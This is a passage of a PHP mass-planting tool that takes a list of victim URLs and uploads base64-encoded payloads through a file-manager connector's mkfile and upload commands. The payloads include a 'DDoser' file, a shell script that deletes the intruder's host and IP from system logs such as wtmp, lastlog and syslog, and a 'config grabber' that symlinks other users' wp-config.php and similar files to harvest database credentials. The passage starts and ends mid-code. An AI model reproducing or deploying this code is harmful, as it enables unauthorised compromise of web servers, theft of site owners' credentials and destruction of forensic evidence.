gICAgIH0NCiAgICAgICAgICAgIA0KPz4NCg0KPC9jZW50ZXI+DQo8L2Rpdj4NCjxpZnJhbWUgc3JjPSJodHRwOi8vOTEuMjM0LjEwNC41L1lHJTIwLSUyME15JTIwTmlnZ2ElMjAoRXhwbGljaXQpJTIwZnQuJTIwSmVlenksJTIwUmljaCUyMEhvbWllJTIwUXVhbi5tcDMiIHdpZHRoPSIwIiBoZWlnaHQ9IjEiPjwvaWZyYW1lPg==";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Snox Ddoser (snox.php) berhasil di tanam coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="d" value="PLANT Gh0st Log Parser">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['d']) {
	foreach($target as $korban) {
		$global = "gh0st.sh";
		$isi_nama_doang = "IyEvYmluL3NoDQojIGdoMHN0LnNoIC0gYnkgYmVuekBzbGFja25ldC5vcmcgW2h0dHA6Ly9iZW56LnNsYWNrbmV0Lm9yZ10NCiMgbG9nIHBhcnNpbmcgc2hlbGwgc2NyaXB0IHRvIGVyYXNlIHJlY29yZHMgb2YgeW91ciBwcmVzZW5jZQ0KDQplY2hvICJnaDBzdC5zaCAtIGJ5IGJlbnpAc2xhY2tuZXQub3JnIFtodHRwOi8vYmVuei5zbGFja25ldC5vcmddIg0KZWNobyAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSINCmlmIFsgIiQxIiA9ICIiIF07IHRoZW4NCiBlY2hvICJbZ2gwc3RdOiB1c2FnZSAtLSAkMCA8eW91ciBob3N0PiINCiBleGl0IDANCmZpDQpnX2lwPWBob3N0ICQxIHwgZ3JlcCAiaGFzIGFkZHJlc3MiIHwgYXdrICd7cHJpbnQgJDR9J2ANCmVjaG8gLW4gIltnaDBzdF06IGxvb2tpbmcgZm9yIC92YXIvbG9nLi4iDQp2YXJsb2c9InllcyINCmlmIFsgISAtZCAvdmFyL2xvZyBdOyB0aGVuDQogdmFybG9nPSJubyINCmZpDQplY2hvICIgJHZhcmxvZyINCmlmIFsgIiR2YXJsb2ciICE9ICJ5ZXMiIF07IHRoZW4NCiBlY2hvICJbZ2gwc3RdOiB1bmFibGUgdG8gYWNjZXNzIC92YXIvbG9nL21lc3NhZ2VzLi4iDQogZXhpdCAwDQpmaQ0KdmFybG9nbWVzc2FnZXM9InllcyINCmlmIFsgISAtZiAvdmFyL2xvZy9tZXNzYWdlcyBdOyB0aGVuDQogdmFybG9nbWVzc2FnZXM9Im5vIg0KZmkNCmVjaG8gIiAkdmFybG9nbWVzc2FnZXMiDQppZiBbICIkdmFybG9nbWVzc2FnZXMiID0gInllcyIgXTsgdGhlbg0KIGVjaG8gLW4gIltnaDBzdF06IGNoZWNraW5nIGZvciB5b3VyIGhvc3QgaW4gL3Zhci9sb2cvbWVzc2FnZXMuLiINCiBjYXQgL3Zhci9sb2cvbWVzc2FnZXMgfCBncmVwICQxID4vZGV2L251bGwgMj4mMQ0KIGlmIFsgJD8gLWVxIDAgXTsgdGhlbg0KICBpcDE9InllcyINCiAgZWNobyAiIHllcyEgKHBvb2YpIiANCiAgY2F0IC92YXIvbG9nL21lc3NhZ2VzIHwgZ3JlcCAtdiAkMSAxPi5tc2cudG1wIDI+Lm1zZy50bXANCiAgbXYgLm1zZy50bXAgL3Zhci9sb2cvbWVzc2FnZXMNCiAgdG91Y2ggL3Zhci9sb2cvbWVzc2FnZXMNCiBmaSANCiBpZiBbICIkaXAxIiAhPSAieWVzIiBdOyB0aGVuDQogZWNobyAiIG5vLiINCiBmaQ0KIGVjaG8gLW4gIltnaDBzdF06IGNoZWNraW5nIGZvciB5b3VyIGlwICgkZ19pcCkgaW4gL3Zhci9sb2cvbWVzc2FnZXMuLiINCiBjYXQgL3Zhci9sb2cvbWVzc2FnZXMgfCBncmVwICIkZ19pcCIgPi9kZXYvbnVsbCAyPiYxDQogaWYgWyAkPyAtZXEgMCBdOyB0aGVuDQogIGVjaG8gIiB5ZXMhIg0KICBpcDI9InllcyINCiAgY2F0IC92YXIvbG9nL21lc3NhZ2VzIHwgZ3JlcCAtdiAkZ19pcCAxPi5tc2cudG1wIDI+Lm1zZy50bXANCiAgbXYgLm1zZy50bXAgL3Zhci9sb2cvbWVzc2FnZXMgDQogIHRvdWNoIC92YXIvbG9nL21lc3NhZ2VzDQogZmkNCiBpZiBbICIkaXAyIiAhPSAieWVzIiBdOyB0aGVuDQogIGVjaG8gIiBuby4iDQogZmkNCmZpDQogDQplY2hvIC1uICJbZ2gwc3RdOiBsb29raW5nIGZvciAvdmFyL2xvZy9zZWN1cmUuLiINCnZhcmxvZ3NlY3VyZT0ieWVzIg0KaWYgWyAhIC1mIC92YXIvbG9nL3NlY3VyZSBdOyB0aGVuDQogdmFybG9nc2VjdXJlPSJubyINCmZpDQplY2hvICIgJHZhcmxvZ3NlY3VyZSINCmlmIFsgIiR2YXJsb2dzZWN1cmUiID0gInllcyIgXTsgdGhlbg0KIGVjaG8gLW4gIltnaDBzdF06IGNoZWNraW5nIGZvciB5b3VyIGhvc3QgaW4gL3Zhci9sb2cvc2VjdXJlLi4iDQogY2F0IC92YXIvbG9nL3NlY3VyZSB8IGdyZXAgJDEgPi9kZXYvbnVsbCAyPiYxDQogaWYgWyAkPyAtZXEgMCBdOyB0aGVuDQogIGlwMz0ieWVzIg0KICBlY2hvICIgeWVzISAocG9vZikiDQogIGNhdCAvdmFyL2xvZy9zZWN1cmUgfCBncmVwIC12ICQxIDE+Lm1zZy50bXAgMj4ubXNnLnRtcA0KICBtdiAubXNnLnRtcCAvdmFyL2xvZy9zZWN1cmUNCiAgdG91Y2ggL3Zhci9sb2cvc2VjdXJlDQogZmkNCiBpZiBbICIkaXAzIiAhPSAieWVzIiBdOyB0aGVuDQogIGVjaG8gIiBuby4iDQogZmkNCiBlY2hvIC1uICJbZ2gwc3RdOiBjaGVja2luZyBmb3IgeW91ciBpcCAoJGdfaXApIGluIC92YXIvbG9nL3NlY3VyZS4uIg0KIGNhdCAvdmFyL2xvZy9zZWN1cmUgfCBncmVwICIkZ19pcCIgPi9kZXYvbnVsbCAyPiYxDQogaWYgWyAkPyAtZXEgMCBdOyB0aGVuDQogIGVjaG8gIiB5ZXMhIg0KICBpcDQ9InllcyINCiAgY2F0IC92YXIvbG9nL3NlY3VyZSB8IGdyZXAgLXYgJGdfaXAgMT4ubXNnLnRtcCAyPi5tc2cudG1wDQogIG12IC5tc2cudG1wIC92YXIvbG9nL3NlY3VyZQ0KICB0b3VjaCAvdmFyL2xvZy9zZWN1cmUNCiBmaQ0KIGlmIFsgIiRpcDQiICE9ICJ5ZXMiIF07IHRoZW4NCiAgZWNobyAiIG5vLiINCiBmaQ0KZmkNCmVjaG8gLW4gIltnaDBzdF06IGxvb2tpbmcgZm9yIC92YXIvbG9nL2xhc3Rsb2cuLiINCnZhcmxvZ2xhc3Q9InllcyINCmlmIFsgISAtZiAvdmFyL2xvZy9sYXN0bG9nIF07IHRoZW4NCiB2YXJsb2dsYXN0PSJubyINCmZpDQplY2hvICIgJHZhcmxvZ2xhc3QiDQppZiBbICIkdmFybG9nbGFzdCIgPSAieWVzIiBdOyB0aGVuDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaG9zdCBpbiAvdmFyL2xvZy9sYXN0bG9nLi4iDQogY2F0IC92YXIvbG9nL2xhc3Rsb2cgfCBncmVwICQxID4vZGV2L251bGwgMj4mMQ0KIGlmIFsgJD8gLWVxIDAgXTsgdGhlbg0KICBpcDU9InllcyINCiAgZWNobyAiIHllcyEgKHBvb2YpIg0KICBjYXQgL3Zhci9sb2cvbGFzdGxvZyB8IGdyZXAgLXYgJDEgMT4ubXNnLnRtcCAyPi5tc2cudG1wDQogIG12IC5tc2cudG1wIC92YXIvbG9nL2xhc3Rsb2cNCiAgdG91Y2ggL3Zhci9sb2cvbGFzdGxvZw0KIGZpDQogaWYgWyAiJGlwNSIgIT0gInllcyIgXTsgdGhlbg0KICBlY2hvICIgbm8uIg0KIGZpDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaXAgKCRnX2lwKSBpbiAvdmFyL2xvZy9sYXN0bG9nLi4iDQogY2F0IC92YXIvbG9nL2xhc3Rsb2cgfCBncmVwICIkZ19pcCIgPi9kZXYvbnVsbCAyPiYxDQogaWYgWyAkPyAtZXEgMCBdOyB0aGVuDQogIGVjaG8gIiB5ZXMhIg0KICBpcDY9InllcyINCiAgY2F0IC92YXIvbG9nL2xhc3Rsb2cgfCBncmVwIC12ICRnX2lwIDE+Lm1zZy50bXAgMj4ubXNnLnRtcA0KICBtdiAubXNnLnRtcCAvdmFyL2xvZy9sYXN0bG9nDQogIHRvdWNoIC92YXIvbG9nL2xhc3Rsb2cNCiBmaQ0KIGlmIFsgIiRpcDYiICE9ICJ5ZXMiIF07IHRoZW4NCiAgZWNobyAiIG5vLiINCiBmaQ0KZmkNCmVjaG8gLW4gIltnaDBzdF06IGxvb2tpbmcgZm9yIC92YXIvbG9nL3d0bXAuLiINCnZhcmxvZ3d0bXA9InllcyINCmlmIFsgISAtZiAvdmFyL2xvZy93dG1wIF07IHRoZW4NCiB2YXJsb2d3dG1wPSJubyINCmZpDQplY2hvICIgJHZhcmxvZ3d0bXAiDQppZiBbICIkdmFybG9nd3RtcCIgPSAieWVzIiBdOyB0aGVuDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaG9zdCBpbiAvdmFyL2xvZy93dG1wLi4iDQogY2F0IC92YXIvbG9nL3d0bXAgfCBncmVwICQxID4vZGV2L251bGwgMj4mMQ0KIGlmIFsgJD8gLWVxIDAgXTsgdGhlbg0KICBpcDc9InllcyINCiAgZWNobyAiIHllcyEgKHBvb2YpIg0KICBjYXQgL3Zhci9sb2cvd3RtcCB8IGdyZXAgLXYgJDEgMT4ubXNnLnRtcCAyPi5tc2cudG1wDQogIG12IC5tc2cudG1wIC92YXIvbG9nL3d0bXANCiAgdG91Y2ggL3Zhci9sb2cvd3RtcA0KIGZpDQogaWYgWyAiJGlwNyIgIT0gInllcyIgXTsgdGhlbg0KICBlY2hvICIgbm8uIg0KIGZpDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaXAgKCRnX2lwKSBpbiAvdmFyL2xvZy93dG1wLi4iDQogY2F0IC92YXIvbG9nL3d0bXAgfCBncmVwICIkZ19pcCIgPi9kZXYvbnVsbCAyPiYxDQogaWYgWyAkPyAtZXEgMCBdOyB0aGVuDQogIGVjaG8gIiB5ZXMhIg0KICBpcDg9InllcyINCiAgY2F0IC92YXIvbG9nL3d0bXAgfCBncmVwIC12ICRnX2lwIDE+Lm1zZy50bXAgMj4ubXNnLnRtcA0KICBtdiAubXNnLnRtcCAvdmFyL2xvZy93dG1wDQogIHRvdWNoIC92YXIvbG9nL3d0bXANCiBmaQ0KIGlmIFsgIiRpcDciICE9ICJ5ZXMiIF07IHRoZW4NCiAgZWNobyAiIG5vLiINCiBmaQ0KZmkNCg0KZWNobyAtbiAiW2doMHN0XTogbG9va2luZyBmb3IgL3Zhci9sb2cveGZlcmxvZy4uIg0KdmFybG9neGZlcj0ieWVzIg0KaWYgWyAhIC1mIC92YXIvbG9nL3hmZXJsb2cgXTsgdGhlbg0KIHZhcmxvZ3hmZXI9Im5vIg0KZmkNCmVjaG8gIiAkdmFybG9neGZlciINCmlmIFsgIiR2YXJsb2d4ZmVyIiA9ICJ5ZXMiIF07IHRoZW4gDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaG9zdCBpbiAvdmFyL2xvZy94ZmVybG9nLi4iDQogY2F0IC92YXIvbG9nL3hmZXJsb2cgfCBncmVwICQxID4vZGV2L251bGwgMj4mMQ0KIGlmIFsgJD8gLWVxIDAgXTsgdGhlbg0KICBpcDg9InllcyINCiAgZWNobyAiIHllcyEgKHBvb2YpIg0KICBjYXQgL3Zhci9sb2cveGZlcmxvZyB8IGdyZXAgLXYgJDEgMT4ubXNnLnRtcCAyPi5tc2cudG1wDQogIG12IC5tc2cudG1wIC92YXIvbG9nL3hmZXJsb2cNCiAgdG91Y2ggL3Zhci9sb2cveGZlcmxvZw0KIGZpDQogaWYgWyAiJGlwOCIgIT0gInllcyIgXTsgdGhlbg0KICBlY2hvICIgbm8uIg0KIGZpDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaXAgKCRnX2lwKSBpbiAvdmFyL2xvZy94ZmVybG9nLi4iDQogY2F0IC92YXIvbG9nL3hmZXJsb2cgfCBncmVwICIkZ19pcCIgPi9kZXYvbnVsbCAyPiYxDQogaWYgWyAkPyAtZXEgMCBdOyB0aGVuDQogIGVjaG8gIiB5ZXMhIg0KICBpcDk9InllcyINCiAgY2F0IC92YXIvbG9nL3hmZXJsb2cgfCBncmVwIC12ICRnX2lwIDE+Lm1zZy50bXAgMj4ubXNnLnRtcA0KICBtdiAubXNnLnRtcCAvdmFyL2xvZy94ZmVybG9nDQogIHRvdWNoIC92YXIvbG9nL3hmZXJsb2cNCiBmaQ0KIGlmIFsgIiRpcDkiICE9ICJ5ZXMiIF07IHRoZW4NCiAgZWNobyAiIG5vLiINCiBmaQ0KZmkgDQoNCmVjaG8gLW4gIltnaDBzdF06IGxvb2tpbmcgZm9yIC92YXIvbG9nL3N5c2xvZy4uIg0KdmFybG9nc3lzPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9sb2cvc3lzbG9nIF07IHRoZW4NCiB2YXJsb2dzeXM9Im5vIg0KZmkNCmVjaG8gIiAkdmFybG9nc3lzIg0KaWYgWyAiJHZhcmxvZ3N5cyIgPSAieWVzIiBdOyB0aGVuDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaG9zdCBpbiAvdmFyL2xvZy9zeXNsb2cuLiINCiBjYXQgL3Zhci9sb2cvc3lzbG9nIHwgZ3JlcCAkMSA+L2Rldi9udWxsIDI+JjENCiBpZiBbICQ/IC1lcSAwIF07IHRoZW4NCiAgaXAxMD0ieWVzIg0KICBlY2hvICIgeWVzISAocG9vZikiDQogIGNhdCAvdmFyL2xvZy9zeXNsb2cgfCBncmVwIC12ICQxIDE+Lm1zZy50bXAgMj4ubXNnLnRtcA0KICBtdiAubXNnLnRtcCAvdmFyL2xvZy9zeXNsb2cNCiAgdG91Y2ggL3Zhci9sb2cvc3lzbG9nDQogZmkNCiBpZiBbICIkaXAxMCIgIT0gInllcyIgXTsgdGhlbg0KICBlY2hvICIgbm8uIg0KIGZpDQogZWNobyAtbiAiW2doMHN0XTogY2hlY2tpbmcgZm9yIHlvdXIgaXAgKCRnX2lwKSBpbiAvdmFyL2xvZy9zeXNsb2cuLiINCiBjYXQgL3Zhci9sb2cvc3lzbG9nIHwgZ3JlcCAiJGdfaXAiID4vZGV2L251bGwgMj4mMQ0KIGlmIFsgJD8gLWVxIDAgXTsgdGhlbg0KICBlY2hvICIgeWVzISINCiAgaXAxMT0ieWVzIg0KICBjYXQgL3Zhci9sb2cvc3lzbG9nIHwgZ3JlcCAtdiAkZ19pcCAxPi5tc2cudG1wIDI+Lm1zZy50bXANCiAgbXYgLm1zZy50bXAgL3Zhci9sb2cvc3lzbG9nDQogIHRvdWNoIC92YXIvbG9nL3N5c2xvZw0KIGZpDQogaWYgWyAiJGlwMTEiICE9ICJ5ZXMiIF07IHRoZW4NCiAgZWNobyAiIG5vLiINCiBmaQ0KZmkNCmVjaG8gIltnaDBzdF06IHBhcnNpbmcgY29tcGxldGUuIGVvZiINCmV4aXQgMA0K";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Gh0st Log Parser berhasil di tanam coba cek, backconnect dan akses file gh0st.sh nya<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="e" value="PLANT x00x Config's Grabber By DamaneDz">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['e']) {
	foreach($target as $korban) {
		$global = "x00x.php";
		$isi_nama_doang = "PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT54MDB4IENvbmZpZydzIEdyYWJiZXIgQnkgRGFtYW5lRHo8L3RpdGxlPg0KPHN0eWxlPg0KYm9keXtiYWNrZ3JvdW5kLWNvbG9yOiM4MDgwODA7Y29sb3I6I0ZGRjthbGlnbjpjZW50ZXI7Zm9udDogMTJwdCBWZXJkYW5hO30NCmlucHV0W3R5cGU9dGV4dF0sdGV4dGFyZWEsc2VsZWN0LGlucHV0W3R5cGU9cGFzc3dvcmRdLGJ1dHRvbixzdWJtaXR7Ym9yZGVyOiA1cHggIzQwNDA0MCBzb2xpZDtiYWNrZ3JvdW5kOiAjMTQxNDE0Ow0KY29sb3I6ICNGRkY7Zm9udDogMTJwdCBWZXJkYW5hO291dGxpbmU6IG5vbmU7Ym9yZGVyLXJhZGl1czogNXB4O29wYWNpdHk6MC43O30NCnRleHRhcmVhe3dpZHRoOiA1MjVweDsgaGVpZ2h0OiAzMDFweDt9DQppbnB1dFt0eXBlPXN1Ym1pdF0sIC5idXR0b24sIGlucHV0W3R5cGU9cmVzZXRdLCBidXR0b24ge2JhY2tncm91bmQ6ICM0MDQwNDA7Y29sb3I6ICNGRkY7Zm9udDogMTJwdCBWZXJkYW5hO291dGxpbmU6IG5vbmU7DQpvcGFjaXR5OjE7ZmlsdGVyOmFscGhhKG9wYWNpdHk9OTApOyBwYWRkaW5nOiA1cHggOHB4ICFpbXBvcnRhbnQ7Ym9yZGVyOiBub25lICFpbXBvcnRhbnQ7Ym9yZGVyLXJhZGl1czogNXB4O30NCi5iYW5uZXJ7Y29sb3I6ICNGRkZGRkY7YmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDtmb250OiAyNXB0IFZlcmRhbmE7fQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGNlbnRlcj4NCjxkaXYgY2xhc3M9ImJhbm5lciI+eDAweCBDb25maWcncyBHcmFiYmVyIEJ5IERhbWFuZUR6PC9kaXY+PC9icj4NCjxwPiZuYnNwOzwvcD4NCjxmb3JtIG1ldGhvZD0iUE9TVCI+DQpQYXNzd2QgRmlsZToNCjxwPiZuYnNwOzwvcD4NCjx0ZXh0YXJlYSBuYW1lPSJwYXNzd2QiID48L3RleHRhcmVhPjwvYnI+DQo8cD4mbmJzcDs8L3A+DQo8aW5wdXQgbmFtZT0iY2F0IiBzaXplPSI4MCIgdmFsdWU9IlN0YXJ0IiB0eXBlPSJzdWJtaXQiPjwvYnI+DQo8L2Zvcm0+DQo8P3BocA0KDQovKg0KVGhpcyBGaWxlIFdhcyBXcml0ZWQgQnkgRGFtYW5lRHouDQogDQpUd2l0dGVyOkBEYW1hbmVEeg0KRW1haWw6RGFtYW5lLUR6QGhvdG1haWwuY29tDQpTa3lwZTpEYW1hbmUyMDExDQoNCjIwMTMgRHpfQWxnZXJpYQ0KKi8NCg0KQGVycm9yX3JlcG9ydGluZygwKTsNCkBzZXRfdGltZV9saW1pdCgwKTsNCg0KaWYoJF9QT1NUWyJjYXQiXSAmJiAhJF9QT1NUWyJwYXNzd2QiXT09IiIpew0KZWNobyAiQ2hlY2tpbmcgRnVuY3Rpb25zIC4uLjxicj4iOw0KJGZ1bmN0aW9ucz1AaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCmlmKGVyZWdpKCJzeW1saW5rIiwkZnVuY3Rpb25zKSl7DQpkaWUoIjxmb250IGNvbG9yPXJlZD5TeW1saW5rIEZ1bmN0aW9uIGlzIERpc2FibGVELCBZb3UgQ2FuJ3QgQ29udGludWUgVGhpcyBQcm9jZXNzICEhPC9mb250PiIpOw0KfQ0KZWNobyAiQ2hlY2tpbmcgRG9uZSBXaXRob3V0IFByb2JsZW1zLCBDb250aW51ZSAuLi48YnI+IjsNCkBta2RpcigieDAweF9jb25maWdzIiwgMDc1NSk7DQpAY2hkaXIoIngwMHhfY29uZmlncyIpOw0KJGh0YWNjZXNzPSINCk9wdGlvbnMgYWxsDQpPcHRpb25zICtJbmRleGVzDQpPcHRpb25zICtGb2xsb3dzeW1saW5rcw0KRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwNCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwDQpBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocA0KQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sDQpBZGRIYW5kbGVyIHR4dCAuaHRtbA0KUmVxdWlyZSBOb25lIA0KU2F0aXNmeSBBbnkNCiI7DQpmaWxlX3B1dF9jb250ZW50cygiLmh0YWNjZXNzIiwkaHRhY2Nlc3MsRklMRV9BUFBFTkQpOw0KJHBhc3N3ZD0kX1BPU1RbInBhc3N3ZCJdOw0KJHBhc3N3ZD1leHBsb2RlKCJcbiIsJHBhc3N3ZCk7DQplY2hvICJTdGFydCBTeW1saW5raW5nIC4uLjxicj4iOw0KZm9yZWFjaCgkcGFzc3dkIGFzICRwd2Qpew0KJHBhd2Q9ZXhwbG9kZSgiOiIsJHB3ZCk7DQokdXNlciA9JHBhd2RbMF07DQovLyBOb3cgc3ltbGluayBUaGVtDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCR1c2VyLictc2hvcC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHVzZXIuJy1zaG9wLW9zLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkdXNlci4nLW9zY29tLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCR1c2VyLictb3Njb21tZXJjZS50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHVzZXIuJy1vc2NvbW1lcmNlcy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkdXNlci4nLXNob3AyLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkdXNlci4nLXNob3Atc2hvcHBpbmcudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHVzZXIuJy1zYWxlLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkdXNlci4nLWFtZW1iZXIudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkdXNlci4nLWFtZW1iZXIyLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLW1lbWJlcnMudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCR1c2VyLictNGltYWdlczEudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCR1c2VyLictZm9ydW0udHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkdXNlci4nLWZvcnVtcy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCR1c2VyLictNS50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJHVzZXIuJy00LnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkdXNlci4nLXdwMTMudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCR1c2VyLictd3AxMy13cC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsJHVzZXIuJy13cDEzLVdQLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCR1c2VyLictd3AxMy13cC1iZXRhLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCR1c2VyLictd3AxMy1iZXRhLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkdXNlci4nLXdwMTMtcHJlc3MudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkdXNlci4nLXdwMTMtd29yZHByZXNzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9Xb3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHVzZXIuJy13cDEzLVdvcmRwcmVzcy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkdXNlci4nLXdwMTMtV29yZHByZXNzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkdXNlci4nLXdwMTMtd29yZHByZXNzLWJldGEudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJHVzZXIuJy13cDEzLW5ld3MudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkdXNlci4nLXdwMTMtbmV3LnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCR1c2VyLictd3AtYmxvZy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkdXNlci4nLXdwLWJldGEudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCR1c2VyLictd3AtYmxvZ3MudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJHVzZXIuJy13cC1ob21lLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJHVzZXIuJy13cC1wcm90YWwudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJHVzZXIuJy13cC1zaXRlLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCR1c2VyLictd3AtbWFpbi50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVi